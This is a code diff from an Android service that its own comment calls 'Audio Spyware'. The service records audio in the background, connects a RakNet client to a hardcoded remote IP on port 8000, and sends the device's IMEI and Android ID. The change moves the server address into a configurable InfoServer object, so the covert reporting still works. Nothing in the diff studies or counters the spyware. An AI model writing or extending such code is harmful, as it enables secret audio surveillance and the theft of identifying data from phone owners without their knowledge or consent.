@@ -24,9 +24,8 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         System.load("libSilenceAudioRecordingNative.so");
     }
 
-    //server values
-    private final String  mHost = "2.227.12.76";
-    private final int     mPort = 8000;
+    //server values (default)
+    InfoServer mInfo = new InfoServer("2.227.12.76",8000);
     //thread values
     private Thread  mThread = null;
     private boolean mLoop = true;
@@ -96,7 +95,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
                 //re-try to restart
                 if(canRecordAudio())
                 {
-                    RakClient.start(mHost, mPort);
+                    RakClient.start(mInfo.mHost, mInfo.mPort);
                 }
                 //sleep thread
                 try
@@ -127,10 +126,12 @@ public class SilenceAudioRecordingService extends Service implements Runnable
     public void onCreate()
     {
         super.onCreate();
+        // parse
+        mInfo.read(getBaseContext());
         // Start RakNet client Audio Spyware
         if(canRecordAudio())
         {
-            RakClient.start(mHost, mPort);
+            RakClient.start(mInfo.mHost, mInfo.mPort);
         }
         RakClient.setIMEI(getIMEI());
         RakClient.setAndroidID(getAndroidID());
